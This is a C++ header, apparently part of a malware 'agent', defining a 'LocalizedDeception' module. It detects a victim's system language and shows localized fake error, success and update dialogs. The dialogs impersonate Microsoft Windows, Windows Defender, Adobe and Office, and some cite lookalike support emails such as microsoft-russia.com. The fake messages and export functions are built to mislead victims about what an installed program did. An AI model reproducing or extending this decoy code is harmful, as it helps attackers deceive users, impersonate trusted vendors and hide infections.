#pragma once

#include <windows.h>
#include <vector>
#include <string>
#include <map>
#include <random>

namespace LocalizedDeception {

// =======================================================================
// Определение языков и регионов
// =======================================================================

enum class LanguageCode {
    ENGLISH = 0,        // en-US, en-GB, en-CA, etc.
    RUSSIAN = 1,        // ru-RU, ru-BY, ru-KZ, etc.
    GERMAN = 2,         // de-DE, de-AT, de-CH, etc.
    FRENCH = 3,         // fr-FR, fr-CA, fr-BE, etc.
    SPANISH = 4,        // es-ES, es-MX, es-AR, etc.
    ITALIAN = 5,        // it-IT
    PORTUGUESE = 6,     // pt-BR, pt-PT
    CHINESE_SIMPLIFIED = 7,  // zh-CN
    CHINESE_TRADITIONAL = 8, // zh-TW, zh-HK
    JAPANESE = 9,       // ja-JP
    KOREAN = 10,        // ko-KR
    DUTCH = 11,         // nl-NL, nl-BE
    POLISH = 12,        // pl-PL
    CZECH = 13,         // cs-CZ
    HUNGARIAN = 14,     // hu-HU
    BULGARIAN = 15,     // bg-BG
    UKRAINIAN = 16,     // uk-UA
    TURKISH = 17,       // tr-TR
    ARABIC = 18,        // ar-SA, ar-EG, etc.
    HEBREW = 19,        // he-IL
    UNKNOWN = 20
};

// Структура для хранения локализованных сообщений
struct LocalizedMessage {
    LanguageCode language;
    std::string errorMessage;
    std::string successMessage;
    std::string warningMessage;
    std::string infoMessage;
    std::string windowTitle;
    std::string buttonOK;
    std::string buttonCancel;
};

// =======================================================================
// RegionDetector - Определение региона и языка системы
// =======================================================================

class RegionDetector {
private:
    LanguageCode detectedLanguage;
    std::string countryCode;
    std::string languageCode;
    LCID systemLCID;
    
public:
    RegionDetector();
    ~RegionDetector();
    
    // Определение региона и языка
    bool DetectSystemLanguage();
    LanguageCode GetDetectedLanguage() const { return detectedLanguage; }
    std::string GetCountryCode() const { return countryCode; }
    std::string GetLanguageCode() const { return languageCode; }
    LCID GetSystemLCID() const { return systemLCID; }
    
    // Детальная информация о системе
    std::string GetSystemLocaleName();
    std::string GetKeyboardLayout();
    std::string GetTimeZone();
    std::string GetCurrencySymbol();
    std::string GetDateFormat();
    std::string GetNumberFormat();
    
    // Дополнительные проверки
    bool IsRightToLeftLanguage();
    bool IsAsianLanguage();
    bool IsEuropeanLanguage();
    
private:
    LanguageCode MapLCIDToLanguage(LCID lcid);
    std::string GetLanguageNameFromLCID(LCID lcid);
    std::string GetCountryNameFromLCID(LCID lcid);
};

// =======================================================================
// LocalizedMessageManager - Управление локализованными сообщениями
// =======================================================================

class LocalizedMessageManager {
private:
    std::map<LanguageCode, std::vector<LocalizedMessage>> messageDatabase;
    LanguageCode currentLanguage;
    RegionDetector* regionDetector;
    
public:
    LocalizedMessageManager();
    ~LocalizedMessageManager();
    
    // Инициализация
    bool Initialize();
    void InitializeAllLanguages();
    
    // Установка языка
    void SetLanguage(LanguageCode lang);
    void AutoDetectLanguage();
    LanguageCode GetCurrentLanguage() const { return currentLanguage; }
    
    // Получение сообщений
    std::string GetRandomErrorMessage();
    std::string GetRandomSuccessMessage();
    std::string GetRandomWarningMessage();
    std::string GetRandomInfoMessage();
    std::string GetRandomWindowTitle();
    
    // Кастомные сообщения
    std::string GetLocalizedMessage(const std::string& messageKey);
    void AddCustomMessage(LanguageCode lang, const std::string& key, const std::string& message);
    
private:
    void InitializeEnglishMessages();
    void InitializeRussianMessages();
    void InitializeGermanMessages();
    void InitializeFrenchMessages();
    void InitializeSpanishMessages();
    void InitializeItalianMessages();
    void InitializePortugueseMessages();
    void InitializeChineseMessages();
    void InitializeJapaneseMessages();
    void InitializeKoreanMessages();
    void InitializeDutchMessages();
    void InitializePolishMessages();
    void InitializeCzechMessages();
    void InitializeHungarianMessages();
    void InitializeBulgarianMessages();
    void InitializeUkrainianMessages();
    void InitializeTurkishMessages();
    void InitializeArabicMessages();
    void InitializeHebrewMessages();
};

// =======================================================================
// Предзаполненные сообщения для разных языков
// =======================================================================

namespace MessageTemplates {
    
    // Русские сообщения
    const std::vector<std::string> RUSSIAN_ERRORS = {
        "Файл поврежден или содержит ошибки.\n\nОбратитесь в службу поддержки:\nsupport@microsoft-russia.com\n\nКод ошибки: 0x80070002",
        "Ошибка проверки цифровой подписи.\n\nВозможно файл был поврежден при загрузке.\nПопробуйте скачать заново с официального сайта.",
        "Недостаточно места на диске для установки.\n\nТребуется минимум 150 МБ свободного места.\nОчистите диск и попробуйте снова.",
        "Срок действия лицензии истек.\n\nОбратитесь к системному администратору\nдля продления лицензии Microsoft Windows.",
        "Ошибка подключения к серверу активации.\n\nПроверьте подключение к интернету\nи повторите попытку через 10 минут.",
        "Ваш регион не поддерживается данной версией.\n\nИспользуйте версию для России и СНГ\nс официального сайта разработчика."
    };
    
    const std::vector<std::string> RUSSIAN_SUCCESS = {
        "Установка завершена успешно!\n\nПрограмма готова к использованию.\nЗначок добавлен на рабочий стол.",
        "Обновление системы установлено.\n\nВсе компоненты обновлены до последней версии.\nРекомендуется перезагрузка компьютера.",
        "Документы успешно импортированы.\n\nВсего обработано файлов: 24\nМестоположение: Мои документы\\Импорт",
        "Синхронизация с облаком завершена.\n\nВсе данные актуальны.\nПоследнее обновление: сегодня в 15:42"
    };
    
    const std::vector<std::string> RUSSIAN_TITLES = {
        "Microsoft Windows", "Центр обновления Windows", "Ошибка установки", 
        "Успешно", "Системное сообщение", "Adobe Acrobat Reader",
        "Microsoft Office", "Антивирус Windows Defender"
    };
    
    // Английские сообщения
    const std::vector<std::string> ENGLISH_ERRORS = {
        "File is corrupted or contains errors.\n\nContact technical support:\nsupport@microsoft.com\n\nError code: 0x80070002",
        "Digital signature verification failed.\n\nThe file may have been corrupted during download.\nPlease download again from the official website.",
        "Insufficient disk space for installation.\n\nRequired: 150 MB free space\nAvailable: 89 MB\n\nFree up space and try again.",
        "License has expired.\n\nContact your system administrator\nto renew your Microsoft Windows license.",
        "Cannot connect to activation server.\n\nCheck your internet connection\nand try again in 10 minutes.",
        "Your region is not supported by this version.\n\nPlease use the version for your region\nfrom the official developer website."
    };
    
    const std::vector<std::string> ENGLISH_SUCCESS = {
        "Installation completed successfully!\n\nThe program is ready to use.\nShortcut added to desktop.",
        "System update installed.\n\nAll components updated to latest version.\nSystem restart recommended.",
        "Documents imported successfully.\n\nTotal files processed: 24\nLocation: My Documents\\Import",
        "Cloud synchronization completed.\n\nAll data is up to date.\nLast update: today at 3:42 PM"
    };
    
    const std::vector<std::string> ENGLISH_TITLES = {
        "Microsoft Windows", "Windows Update", "Installation Error",
        "Success", "System Message", "Adobe Acrobat Reader",
        "Microsoft Office", "Windows Defender Antivirus"
    };
    
    // Немецкие сообщения
    const std::vector<std::string> GERMAN_ERRORS = {
        "Die Datei ist beschädigt oder enthält Fehler.\n\nWenden Sie sich an den technischen Support:\nsupport@microsoft-deutschland.de\n\nFehlercode: 0x80070002",
        "Überprüfung der digitalen Signatur fehlgeschlagen.\n\nDie Datei wurde möglicherweise beim Download beschädigt.\nBitte laden Sie sie erneut von der offiziellen Website herunter.",
        "Unzureichender Speicherplatz für die Installation.\n\nErforderlich: 150 MB freier Speicherplatz\nVerfügbar: 89 MB\n\nGeben Sie Speicherplatz frei und versuchen Sie es erneut.",
        "Die Lizenz ist abgelaufen.\n\nWenden Sie sich an Ihren Systemadministrator,\num Ihre Microsoft Windows-Lizenz zu erneuern."
    };
    
    const std::vector<std::string> GERMAN_SUCCESS = {
        "Installation erfolgreich abgeschlossen!\n\nDas Programm ist einsatzbereit.\nVerknüpfung wurde zum Desktop hinzugefügt.",
        "System-Update installiert.\n\nAlle Komponenten auf neueste Version aktualisiert.\nSystemneustart empfohlen."
    };
    
    const std::vector<std::string> GERMAN_TITLES = {
        "Microsoft Windows", "Windows Update", "Installationsfehler",
        "Erfolgreich", "Systemmeldung", "Adobe Acrobat Reader"
    };
    
    // Французские сообщения
    const std::vector<std::string> FRENCH_ERRORS = {
        "Le fichier est corrompu ou contient des erreurs.\n\nContactez le support technique :\nsupport@microsoft-france.fr\n\nCode d'erreur : 0x80070002",
        "Échec de la vérification de la signature numérique.\n\nLe fichier a peut-être été corrompu lors du téléchargement.\nVeuillez le télécharger à nouveau depuis le site officiel.",
        "Espace disque insuffisant pour l'installation.\n\nRequis : 150 Mo d'espace libre\nDisponible : 89 Mo\n\nLibérez de l'espace et réessayez."
    };
    
    const std::vector<std::string> FRENCH_SUCCESS = {
        "Installation terminée avec succès !\n\nLe programme est prêt à être utilisé.\nRaccourci ajouté au bureau.",
        "Mise à jour du système installée.\n\nTous les composants mis à jour vers la dernière version.\nRedémarrage du système recommandé."
    };
    
    const std::vector<std::string> FRENCH_TITLES = {
        "Microsoft Windows", "Windows Update", "Erreur d'installation",
        "Succès", "Message système", "Adobe Acrobat Reader"
    };
    
    // Испанские сообщения
    const std::vector<std::string> SPANISH_ERRORS = {
        "El archivo está dañado o contiene errores.\n\nContacte con soporte técnico:\nsupport@microsoft-españa.es\n\nCódigo de error: 0x80070002",
        "Error en la verificación de firma digital.\n\nEl archivo pudo haberse dañado durante la descarga.\nPor favor descárguelo nuevamente desde el sitio oficial.",
        "Espacio en disco insuficiente para la instalación.\n\nRequerido: 150 MB de espacio libre\nDisponible: 89 MB\n\nLibere espacio e intente nuevamente."
    };
    
    const std::vector<std::string> SPANISH_SUCCESS = {
        "¡Instalación completada exitosamente!\n\nEl programa está listo para usar.\nAcceso directo agregado al escritorio.",
        "Actualización del sistema instalada.\n\nTodos los componentes actualizados a la última versión.\nSe recomienda reiniciar el sistema."
    };
    
    const std::vector<std::string> SPANISH_TITLES = {
        "Microsoft Windows", "Windows Update", "Error de instalación",
        "Éxito", "Mensaje del sistema", "Adobe Acrobat Reader"
    };
    
    // Китайские сообщения (упрощенный)
    const std::vector<std::string> CHINESE_ERRORS = {
        "文件已损坏或包含错误。\n\n请联系技术支持：\nsupport@microsoft-china.cn\n\n错误代码：0x80070002",
        "数字签名验证失败。\n\n文件可能在下载过程中已损坏。\n请从官方网站重新下载。",
        "磁盘空间不足，无法安装。\n\n所需：150 MB 可用空间\n可用：89 MB\n\n请释放空间后重试。"
    };
    
    const std::vector<std::string> CHINESE_SUCCESS = {
        "安装成功完成！\n\n程序已准备就绪。\n桌面已添加快捷方式。",
        "系统更新已安装。\n\n所有组件已更新到最新版本。\n建议重启系统。"
    };
    
    const std::vector<std::string> CHINESE_TITLES = {
        "Microsoft Windows", "Windows 更新", "安装错误", "成功", "系统消息"
    };
}

// =======================================================================
// AdaptiveMessageGenerator - Умная генерация сообщений
// =======================================================================

class AdaptiveMessageGenerator {
private:
    LocalizedMessageManager* msgManager;
    RegionDetector* regionDetector;
    
    // Контекстная информация
    std::string detectedSoftware;
    std::string systemVersion;
    std::string userLanguage;
    
public:
    AdaptiveMessageGenerator();
    ~AdaptiveMessageGenerator();
    
    bool Initialize();
    
    // Генерация контекстных сообщений
    std::string GenerateContextualErrorMessage();
    std::string GenerateContextualSuccessMessage();
    std::string GenerateOSSpecificMessage();
    std::string GenerateSoftwareSpecificMessage();
    
    // Адаптация под регион
    std::string AdaptMessageToRegion(const std::string& baseMessage);
    std::string AddRegionalContacts(const std::string& message);
    std::string AddLocalCurrency(const std::string& message);
    std::string AddLocalDateTime(const std::string& message);
    
    // Умные заголовки
    std::string GenerateSmartTitle();
    std::string GetOSSpecificTitle();
    std::string GetSoftwareSpecificTitle();
    
private:
    void DetectInstalledSoftware();
    void AnalyzeSystemContext();
    std::string GetRegionalSupportEmail();
    std::string GetRegionalPhoneNumber();
};

// =======================================================================
// Export Functions - Функции для использования в основном агенте
// =======================================================================

extern "C" {
    // Инициализация локализованной системы сообщений
    bool InitLocalizedDeception();
    void ShutdownLocalizedDeception();
    
    // Автоматическое определение языка
    bool AutoDetectSystemLanguage();
    int GetDetectedLanguageCode();
    const char* GetDetectedLanguageName();
    const char* GetDetectedCountryCode();
    
    // Установка языка вручную
    void SetDeceptionLanguage(int languageCode);
    
    // Показ локализованных сообщений
    void ShowLocalizedError();
    void ShowLocalizedSuccess();
    void ShowLocalizedWarning();
    void ShowLocalizedInfo();
    
    // Генерация умных сообщений
    const char* GenerateSmartErrorMessage();
    const char* GenerateSmartSuccessMessage();
    const char* GenerateContextualMessage();
    
    // Региональные настройки
    const char* GetRegionalSupportContact();
    const char* GetLocalDateTimeFormat();
    const char* GetLocalCurrencySymbol();
    
    // Статус и конфигурация
    const char* GetLocalizationStatus();
    bool IsLanguageSupported(int languageCode);
    int GetSupportedLanguageCount();
}

} // namespace LocalizedDeception